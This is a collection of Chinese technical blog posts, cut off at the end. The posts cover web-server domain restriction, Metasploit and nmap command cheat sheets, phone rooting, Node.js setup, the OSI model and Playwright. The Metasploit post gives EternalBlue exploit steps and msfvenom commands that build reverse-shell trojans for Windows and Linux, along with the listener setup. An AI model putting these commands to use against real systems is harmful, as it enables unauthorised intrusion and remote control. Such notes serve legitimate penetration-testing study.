<h2 id="Nginx-配置">Nginx 配置</h2>
<blockquote>
<p>配置文件位置：</p>
<ul>
<li>Debian/Ubuntu: <code>/etc/nginx/sites-available/default</code></li>
<li>CentOS/RHEL: <code>/etc/nginx/nginx.conf</code></li>
</ul>
<p>启动/重启命令：</p>
<ul>
<li>Debian/Ubuntu/CentOS/RHEL 通用：<code>sudo systemctl restart nginx</code></li>
</ul>
</blockquote>
<h3 id="示例配置-2">示例配置</h3>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="attribute">index</span> index.html index.php;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_log</span> /var/log/nginx/<span class="literal">error</span>.log;</span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/access.log;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li><code>listen 80</code>：监听80端口。</li>
<li><code>server_name</code>：指定主机名。</li>
<li><code>root</code>：指定网站根目录。</li>
<li><code>try_files</code>：检查请求是否为实际存在的文件，否则显示404。</li>
</ul>
<h3 id="仅允许域名访问">仅允许域名访问</h3>
<h4 id="nginx">nginx</h4>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先处理非法 Host</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">404</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只允许指定的域名</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ol>
<li>第一个 server_name _ 区块匹配所有没有匹配到指定 server_name 的请求，直接 404</li>
<li>第二个只允许 <a href="http://www.example.com">www.example.com</a></li>
</ol>
<h4 id="apache">apache</h4>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerName</span> www.example.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> /var/www/html</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拒绝其他请求</span></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerName</span> _</span><br><span class="line">    <span class="section">&lt;Location /&gt;</span></span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> denied</span><br><span class="line">    <span class="section">&lt;/Location&gt;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ol>
<li>第一个配置只允许指定的 <a href="http://www.example.com">www.example.com</a></li>
<li>第二个默认匹配其他 Host 请求，并 Require all denied</li>
</ol>
<h2 id="仅允许域名访问-2">仅允许域名访问</h2>
<h3 id="nginx-2">nginx</h3>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认 Server：处理非法请求</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> _;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对没有匹配到的 Host 返回 404</span></span><br><span class="line">    <span class="attribute">return</span> <span class="number">404</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确的域名配置</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line">    <span class="attribute">index</span> index.html;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ol>
<li>非法处理请求
<ul>
<li>不通过域名访问的处置方式</li>
</ul>
</li>
<li>正确的域名配置
<ul>
<li>设置可访问的域名</li>
</ul>
</li>
</ol>
<h3 id="apache-2">apache</h3>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认虚拟主机配置</span></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerName</span> _default_</span><br><span class="line">    </span><br><span class="line">	  <span class="comment"># 返回403禁止访问</span></span><br><span class="line">    <span class="section">&lt;Location /&gt;</span></span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> denied</span><br><span class="line">    <span class="section">&lt;/Location&gt;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerName</span> www.local.com</span><br><span class="line">    <span class="attribute">ServerAlias</span> www.local.com</span><br><span class="line"></span><br><span class="line">    <span class="attribute">DocumentRoot</span> /usr/share/nginx/html</span><br><span class="line">    <span class="section">&lt;Directory /usr/share/nginx/html&gt;</span></span><br><span class="line">        <span class="attribute">Options</span> -Indexes +FollowSymLinks</span><br><span class="line">        <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">ErrorLog</span> /var/log/httpd/html_error.log</span><br><span class="line">    <span class="attribute">CustomLog</span> /var/log/httpd/html_access.log combined</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>除了拒绝访问，还可以重定向到你的网页</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;Location /&gt;</span></span><br><span class="line">    <span class="attribute">Redirect</span> permanent / http://www.example.com/</span><br><span class="line"><span class="section">&lt;/Location&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：（和nginx相似）</p>
<ol>
<li>默认虚拟主机放在第一个加载的配置文件中，匹配未指定域名的请求，比如直接访问IP</li>
<li>正确的域名配置</li>
</ol>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>基础学习篇</category>
      </categories>
      <tags>
        <tag>apache</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>msfconsole命令</title>
    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="攻击模块">攻击模块</h2>
<p>软件更新</p>
<pre><code>apt update # 更新安装包信息；只检查，不更新
apt upgrade # 更新已安装的软件包，不删除旧包； 
apt full-upgrade # 升级包，删除旧包
</code></pre>
<p>基础使用</p>
<pre><code>msfconsole //进入框架
search  ms17_010 //使用search命令查找相关漏洞
use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
info //使用info查看模块信息
show options //查看参数
set  RHOST  192.168.100.158 //设置参数
exploit/run
</code></pre>
<p>辅助模块(auxiliary)</p>
<p>漏洞利用(exploit)</p>
<p>攻击载荷(payload)：<br>
Stager中几种常见的payload：<br>
windows/meterpreter/bind_tcp       //正向连接<br>
windows/meterpreter/reverse_tcp    //反向连接，常用<br>
windows/meterpreter/reverse_http   //通过监听80端口反向连接<br>
windows/meterpreter/reverse_https  //通过监听443端口反向连接</p>
<h2 id="木马">木马</h2>
<p>windows木马<br>
创建木马</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
</code></pre>
<p>开启kali监听</p>
<pre><code>启动msfconsole
开启监听
	use exploit/multi/handler
设置tcp监听
	set payload windows/meterpreter/reverse_tcp
设置本机ip和端口
	set
输入explore开始监听
</code></pre>
<p>运行木马后木马上线，进入meterpreter</p>
<p>后续同上，不做详细解释</p>
<p>linux elf木马反弹shell创建（msf6版本）</p>
<pre><code>	msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
</code></pre>
<p>监听</p>
<pre><code>msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost xxx.xxx.xxx.xxx
set lport 8888
run
</code></pre>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>oppoA9 mtk手机root</title>
    <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
    <content><![CDATA[<h2 id="mtk手机root">mtk手机root</h2>
<p>通过mtkclient工具连接手机漏洞后，导出boot文件，修补后导回，完成root。</p>
<p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
<pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
</code></pre>
<p>1、oppoA9为例，打开mtkclient工具，手机关机后按住音量±键，插入数据线，等待软件连接<br>
2、连接后通过读分区导出boot文件，不带后缀<br>
3、手机开机安装magisk，通过面具修补boot文件，boot文件改回bin后缀</p>
<p><img src="/images/pasted-2.png" alt="upload successful"></p>
<p>4、同样通过第一步连接手机，刷入修补好的boot文件，重新启动发现无需按电源键即可开机，代表已成功root。</p>
<p><img src="/images/pasted-3.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>手机搞机</category>
      </categories>
      <tags>
        <tag>手机root</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-nodejs安装</title>
    <url>/2025/03/23/nodejs%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="安装nvm">安装nvm</h2>
<p>官方有安装方法，地址为：</p>
<blockquote>
<p><a href="https://nvm.p6p.net/install/linux.html">https://nvm.p6p.net/install/linux.html</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.2/install.sh | bash</span><br><span class="line">source ~/.bashrc</span><br><span class="line">nvm --version</span><br></pre></td></tr></table></figure>
<h2 id="安装nodejs">安装nodejs</h2>
<p>官方同样有方法，地址为：</p>
<blockquote>
<p><a href="https://nodejs.cn/en/download">https://nodejs.cn/en/download</a></p>
</blockquote>
<p>二进制源码地址为：</p>
<blockquote>
<p><a href="https://nodejs.cn/en/download">https://nodejs.cn/en/download</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh | bash</span><br><span class="line">\. &quot;$HOME/.nvm/nvm.sh&quot;</span><br><span class="line">nvm install 18</span><br><span class="line">node -v</span><br></pre></td></tr></table></figure>
<h2 id="报错问题解决">报错问题解决</h2>
<h3 id="依赖版本过低">依赖版本过低</h3>
<ol>
<li>更新gcc</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install centos-release-scl</span><br><span class="line"></span><br><span class="line">yum -y install devtoolset-8-gcc devtoolset-8-gcc-c++ devtoolset-8-binutils</span><br><span class="line"></span><br><span class="line">scl enable devtoolset-8 bash</span><br><span class="line"></span><br><span class="line"># yum安装完,原来的gcc不覆盖，需要执行enable脚本更新环境变量 </span><br><span class="line">source /opt/rh/devtoolset-8/enable</span><br><span class="line"></span><br><span class="line"># 想保持覆盖，可将其写入~/.bashrc或/etc/profile</span><br><span class="line">echo &quot;source /opt/rh/devtoolset-8/enable&quot; &gt;&gt;/etc/profile</span><br><span class="line"></span><br><span class="line"># 查看gcc版本</span><br><span class="line">gcc -v</span><br></pre></td></tr></table></figure>
<p><strong>centos-release-scl</strong> 报错可以<a href="/2025/03/23/centos-release-scl%E6%8A%A5%E9%94%99/">换源</a>解决</p>
<ol start="2">
<li>更新make</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/make/make-4.2.tar.gz</span><br><span class="line">tar -xzvf make-4.2.tar.gz</span><br><span class="line">cd make-4.2</span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line">sudo rm -rf /usr/bin/make</span><br><span class="line">sudo cp ./make /usr/bin/</span><br><span class="line">make -v</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>升级 GLIBC_2.28</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget  https://mirror.bjtu.edu.cn/gnu/libc/glibc-2.28.tar.xz</span><br><span class="line">tar -xf glibc-2.28.tar.xz -C /usr/local/</span><br><span class="line">cd /usr/local/glibc-2.28/</span><br><span class="line">mkdir build</span><br><span class="line">cd build/</span><br><span class="line">../configure --prefix=/usr/local/glibc-2.28</span><br></pre></td></tr></table></figure>
<h3 id="nvm脚本无法下载">nvm脚本无法下载</h3>
<p>网络都没问题，正常访问，但是无法下载，提示证书不安全</p>
<p>github证书肯定是不会过期的，很可能是因为系统时间不对导致的，更新系统时间即可<br>
如果是刚开机不久，很可能会手动同步失败，等一会再执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date</span><br><span class="line">chronyc makestep</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>nodejs</tag>
        <tag>centos环境</tag>
      </tags>
  </entry>
  <entry>
    <title>OSI模型</title>
    <url>/2025/06/23/osi/</url>
    <content><![CDATA[<h2 id="OSI">OSI</h2>
<p>Open Systems Interconnection Model<br>
「开放式系统互联参考模型」</p>
<h2 id="模型内容">模型内容</h2>
<table>
<thead>
<tr>
<th>层次</th>
<th>名称</th>
<th>常见协议</th>
<th>主要作用</th>
<th>封装结构</th>
</tr>
</thead>
<tbody>
<tr>
<td>7</td>
<td>应用层</td>
<td>HTTP、HTTPS、FTP、DNS、SSH、Telnet</td>
<td>提供应用接口，和应用直接交互</td>
<td>原始数据 (Data)</td>
</tr>
<tr>
<td>6</td>
<td>表示层</td>
<td>JPEG、MPEG、TLS、SSL</td>
<td>对数据进行编解码、加密解密、压缩解压</td>
<td>原始数据 (Data)</td>
</tr>
<tr>
<td>5</td>
<td>会话层</td>
<td>RPC、PPTP、SIP</td>
<td>管理建立、维持和终止应用之间的会话</td>
<td>原始数据 (Data)</td>
</tr>
<tr>
<td>4</td>
<td>传输层</td>
<td>TCP、UDP</td>
<td>提供端到端传输、流量控制、错误检测</td>
<td>段 (Segment) 或 报文 (Datagram)</td>
</tr>
<tr>
<td>3</td>
<td>网络层</td>
<td>IP、ICMP、IGMP、OSPF、BGP</td>
<td>路由、寻址、分片及转发</td>
<td>包 (Packet)</td>
</tr>
<tr>
<td>2</td>
<td>数据链路层</td>
<td>Ethernet、PPP、ARP、STP</td>
<td>节点之间的数据帧封装、媒体访问控制</td>
<td>帧 (Frame)</td>
</tr>
<tr>
<td>1</td>
<td>物理层</td>
<td>以太网接口、WiFi、光纤</td>
<td>比特传输、定义接口和传输标准</td>
<td>比特 (Bit)</td>
</tr>
</tbody>
</table>
<h3 id="简单示意封装结构">简单示意封装结构</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">应用层 (Data) </span><br><span class="line">   ↓ </span><br><span class="line">传输层 (Header + Data) -&gt; Segment/Datagram</span><br><span class="line">   ↓ </span><br><span class="line">网络层 (Header + Segment) -&gt; Packet</span><br><span class="line">   ↓ </span><br><span class="line">数据链路层 (Header + Packet + Trailer) -&gt; Frame</span><br><span class="line">   ↓ </span><br><span class="line">物理层 (Bit Stream) -&gt; 比特传输</span><br></pre></td></tr></table></figure>
<p>好，我来<strong>详细解释封装结构</strong>，让你彻底明白 OSI 模型中每层是如何一层层封装起来的：</p>
<hr>
<h2 id="详细">详细</h2>
<h3 id="1-应用层、表示层、会话层">1. 应用层、表示层、会话层</h3>
<p><strong>结构</strong>：原始数据</p>
<ul>
<li>在应用层、表示层、会话层阶段，传输的数据其实就是<strong>应用生成的原始数据</strong>，没有额外的数据头。</li>
<li>例如：一封邮件内容、一段 HTTP 请求。</li>
</ul>
<hr>
<h3 id="2-传输层">2. 传输层</h3>
<p><strong>结构</strong>：<code>传输层头部 + 原始数据</code> → 段 (Segment) 或 报文 (Datagram)</p>
<ul>
<li>
<p>在这一层，传输层（TCP 或 UDP）为原始数据添加自己的<strong>头部</strong>。</p>
</li>
<li>
<p>这个头部里有：</p>
<ul>
<li>源端口、目标端口</li>
<li>序列号、确认号</li>
<li>检查和控制标记</li>
</ul>
</li>
<li>
<p>完成后，形成 <strong>“段”</strong> (TCP) 或 <strong>“报文”</strong> (UDP)。</p>
</li>
</ul>
<p>💡 示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[传输层头] + [应用层的数据]</span><br><span class="line">       ↓</span><br><span class="line">     Segment / Datagram</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="3-网络层">3. 网络层</h3>
<p><strong>结构</strong>：<code>网络层头 + 段</code> → 包 (Packet)</p>
<ul>
<li>
<p>网络层（如 IP）在段的外面再套一层<strong>网络层头</strong>。</p>
</li>
<li>
<p>网络层头里有：</p>
<ul>
<li>源 IP、目标 IP</li>
<li>路由标记、TTL (生存时间) 等</li>
</ul>
</li>
<li>
<p>完成后，形成 <strong>“包”</strong>。</p>
</li>
</ul>
<p>💡 示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[网络层头] + [传输层段] </span><br><span class="line">       ↓</span><br><span class="line">       Packet</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="4-数据链路层">4. 数据链路层</h3>
<p><strong>结构</strong>：<code>链路层头 + 包 + 链路层尾</code> → 帧 (Frame)</p>
<ul>
<li>
<p>在这个阶段，数据链路层（以太网、PPP）为网络层的包添加：</p>
<ul>
<li>源 MAC、目标 MAC</li>
<li>类型字段</li>
<li>CRC 校验等</li>
</ul>
</li>
<li>
<p>完成后，形成 <strong>“帧”</strong>。</p>
</li>
</ul>
<p>💡 示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[链路层头] + [网络层包] + [链路层尾]</span><br><span class="line">       ↓</span><br><span class="line">       Frame</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="5-物理层">5. 物理层</h3>
<p><strong>结构</strong>：比特流 (Bit Stream)</p>
<ul>
<li>物理层只是对<strong>帧</strong>进行电气、光学、射频等调制，形成连续的比特序列。</li>
<li>在这一层，数据就是真正以<strong>位</strong>(Bit)的形式在网线、光纤、无线等媒体上传输。</li>
</ul>
<p>💡 示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Frame ---&gt; 011011001100101011... (Bit Stream)</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="简单总结结构">简单总结结构</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">应用层 ：Data</span><br><span class="line">传输层 ：Header + Data           ➔ Segment / Datagram</span><br><span class="line">网络层 ：Header + Segment        ➔ Packet</span><br><span class="line">链路层 ：Header + Packet + Tail ➔ Frame</span><br><span class="line">物理层 ：Bit Stream              ➔ Bits</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>网络基础</category>
      </categories>
      <tags>
        <tag>osi</tag>
        <tag>网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap命令</title>
    <url>/2024/08/01/nmap%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="常用命令总结">常用命令总结</h2>
<p>命令格式</p>
<pre><code>nmap [参数] [ip]
</code></pre>
<p>主机探测（隐蔽扫描/TCP ACK/TCP SYN/TCP空扫描欺骗防火墙）</p>
<pre><code>nmap -sS/-PS/-PA/-sN ip
</code></pre>
<p>命令表格</p>
<table>
<thead>
<tr>
<th style="text-align:center">命令</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">nmap IP</td>
<td style="text-align:center">扫描IP</td>
</tr>
<tr>
<td style="text-align:center">nmap -v IP</td>
<td style="text-align:center">加强扫描</td>
</tr>
<tr>
<td style="text-align:center">nmap IP1 IP2 …</td>
<td style="text-align:center">扫描多IP</td>
</tr>
<tr>
<td style="text-align:center">nmap a.b.c.*</td>
<td style="text-align:center">扫描整个子网</td>
</tr>
<tr>
<td style="text-align:center">nmap a.b.c.x,y,…</td>
<td style="text-align:center">扫描多子网地址</td>
</tr>
<tr>
<td style="text-align:center">nmap -iL xxx.txt</td>
<td style="text-align:center">根据文件扫描多IP</td>
</tr>
<tr>
<td style="text-align:center">nmap a.b.c.x-y</td>
<td style="text-align:center">扫描子网IP范围</td>
</tr>
<tr>
<td style="text-align:center">nmap a.b.c.* --exclude IP</td>
<td style="text-align:center">排除指定IP扫描整个子网</td>
</tr>
<tr>
<td style="text-align:center">nmap -A IP</td>
<td style="text-align:center">扫描操作系统和路由跟踪</td>
</tr>
<tr>
<td style="text-align:center">nmap -O IP</td>
<td style="text-align:center">探测操作系统</td>
</tr>
<tr>
<td style="text-align:center">nmap -sA/-PN IP</td>
<td style="text-align:center">探测防火墙</td>
</tr>
<tr>
<td style="text-align:center">nmap -sP a.b.c.*</td>
<td style="text-align:center">探测在线主机</td>
</tr>
<tr>
<td style="text-align:center">nmap -F IP</td>
<td style="text-align:center">快速扫描</td>
</tr>
<tr>
<td style="text-align:center">nmap -r IP</td>
<td style="text-align:center">按顺序扫描</td>
</tr>
<tr>
<td style="text-align:center">nmap -iflist</td>
<td style="text-align:center">显示接口和路由信息</td>
</tr>
<tr>
<td style="text-align:center">nmap -p n1,n2… IP</td>
<td style="text-align:center">扫描指定端口</td>
</tr>
<tr>
<td style="text-align:center">nmap -p T:n1,n2… IP</td>
<td style="text-align:center">扫描TCP端口</td>
</tr>
<tr>
<td style="text-align:center">nmap -sU n1,n2… IP</td>
<td style="text-align:center">扫描UDP端口</td>
</tr>
<tr>
<td style="text-align:center">nmap -sV IP</td>
<td style="text-align:center">查看服务的版本</td>
</tr>
<tr>
<td style="text-align:center">nmap -PS IP</td>
<td style="text-align:center">TCP ACK扫描</td>
</tr>
<tr>
<td style="text-align:center">nmap -PA IP</td>
<td style="text-align:center">TCP SYN扫描</td>
</tr>
<tr>
<td style="text-align:center">nmap -sS IP</td>
<td style="text-align:center">隐蔽扫描</td>
</tr>
<tr>
<td style="text-align:center">nmap -sN IP</td>
<td style="text-align:center">TCP空扫描欺骗防火墙</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>playwright-基础使用</title>
    <url>/2025/07/15/playwright-%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="官网">官网</h2>
<blockquote>
<p>官方：<br>
<a href="https://playwright.dev/docs/intro">https://playwright.dev/docs/intro</a><br>
中文网：<br>
<a href="https://playwright.nodejs.cn/">https://playwright.nodejs.cn/</a></p>
</blockquote>
<h2 id="高频常用语法">高频常用语法</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 启动并打开页面</span><br><span class="line">with sync_playwright() as p:</span><br><span class="line">  browser = p.chromium.launch(headless=False)  # 改成 True 可后台</span><br><span class="line">  context = browser.new_context()</span><br><span class="line">  page = context.new_page()</span><br><span class="line"></span><br><span class="line">// 输入 &amp; 点击</span><br><span class="line">page.locator(&#x27;#user&#x27;).fill(&#x27;admin&#x27;);</span><br><span class="line">page.getByRole(&#x27;button&#x27;, &#123; name: &#x27;登录&#x27; &#125;).click();</span><br><span class="line"></span><br><span class="line">// 断言</span><br><span class="line">expect(page.locator(&#x27;.welcome&#x27;)).toHaveText(&#x27;欢迎 admin&#x27;);</span><br><span class="line"></span><br><span class="line">// 截图</span><br><span class="line">page.screenshot(&#123; path: &#x27;login.png&#x27;, fullPage: true &#125;);</span><br><span class="line"></span><br><span class="line">// 关闭</span><br><span class="line">browser.close();</span><br></pre></td></tr></table></figure>
<p>异步版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 启动并打开页面</span><br><span class="line">import asyncio</span><br><span class="line">from playwright.async_api import async_playwright</span><br><span class="line"></span><br><span class="line">async def main():</span><br><span class="line">    async with async_playwright() as p:</span><br><span class="line">        browser = await p.chromium.launch(headless=False, slow_mo=100)</span><br><span class="line">        page = await browser.new_page()</span><br><span class="line">        await page.goto(&quot;https://example.com&quot;)</span><br><span class="line">        await page.locator(&quot;h1&quot;).click()</span><br><span class="line"></span><br><span class="line">        await asyncio.Event().wait()  # 永久挂起</span><br><span class="line">        await browser.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    asyncio.run(main())</span><br><span class="line"></span><br><span class="line">// 输入 &amp; 点击</span><br><span class="line">await page.locator(&#x27;#user&#x27;).fill(&#x27;admin&#x27;);</span><br><span class="line">await page.getByRole(&#x27;button&#x27;, &#123; name: &#x27;登录&#x27; &#125;).click();</span><br><span class="line"></span><br><span class="line">// 断言</span><br><span class="line">await expect(page.locator(&#x27;.welcome&#x27;)).toHaveText(&#x27;欢迎 admin&#x27;);</span><br><span class="line"></span><br><span class="line">// 截图</span><br><span class="line">await page.screenshot(&#123; path: &#x27;login.png&#x27;, fullPage: true &#125;);</span><br><span class="line"></span><br><span class="line">// 关闭</span><br><span class="line">await browser.close();</span><br></pre></td></tr></table></figure>
<h2 id="远程连接浏览器">远程连接浏览器</h2>
<h3 id="开放浏览器端口">开放浏览器端口</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start chrome --remote-debugging-address=0.0.0.0 --remote-debugging-port=9222 --user-data-dir=&quot;D:\下载\tmp&quot; --no-first-run --no-default-browser-check --incognito</span><br></pre></td></tr></table></figure>
<h3 id="连接">连接</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">    browser = p.chromium.connect_over_cdp(<span class="string">&quot;http://localhost:9222&quot;</span>)</span><br><span class="line">    context = browser.contexts[<span class="number">0</span>]</span><br><span class="line">    page = context.pages[<span class="number">0</span>]</span><br><span class="line">    page.goto(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(page.title())</span><br></pre></td></tr></table></figure>
<h2 id="录制生成代码">录制生成代码</h2>
<ol>
<li>常用：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">playwright codegen https://example.com -b chromium --target python -o mobile_test.py</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>直接启动录制：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">playwright codegen https://example.com</span><br></pre></td></tr></table></figure>
<p>或者无网址</p>
<h3 id="参数">参数</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Playwright codegen 参数速查表</span><br><span class="line"># 运行：npx playwright codegen [URL] [OPTIONS]</span><br><span class="line"></span><br><span class="line"># 基本</span><br><span class="line">-o, --output &lt;file&gt;           保存录制脚本到文件</span><br><span class="line">-b, --browser &lt;name&gt;          指定浏览器：chromium|firefox|webkit</span><br><span class="line">--channel &lt;channel&gt;           指定浏览器渠道：chrome|msedge|chrome-beta 等</span><br><span class="line">--target &lt;language&gt;           输出语言：python|python-async|javascript|java|csharp|test</span><br><span class="line"></span><br><span class="line"># 设备与视口</span><br><span class="line">--device &lt;deviceName&gt;         模拟设备，如 &quot;iPhone 11&quot;</span><br><span class="line">--viewport-size &lt;w,h&gt;         自定义窗口大小，如 1280,720</span><br><span class="line"></span><br><span class="line"># 环境</span><br><span class="line">--lang &lt;lang&gt;                 页面语言，如 zh-CN</span><br><span class="line">--color-scheme &lt;scheme&gt;       颜色模式：light|dark|no-preference</span><br><span class="line">--timezone &lt;tz&gt;               时区，如 Asia/Shanghai</span><br><span class="line">--geolocation &lt;lat,lng&gt;       经纬度，如 31.2,121.5</span><br><span class="line"></span><br><span class="line"># 登录态</span><br><span class="line">--save-storage &lt;file&gt;         录制完成后保存浏览器状态（cookies/localStorage）</span><br><span 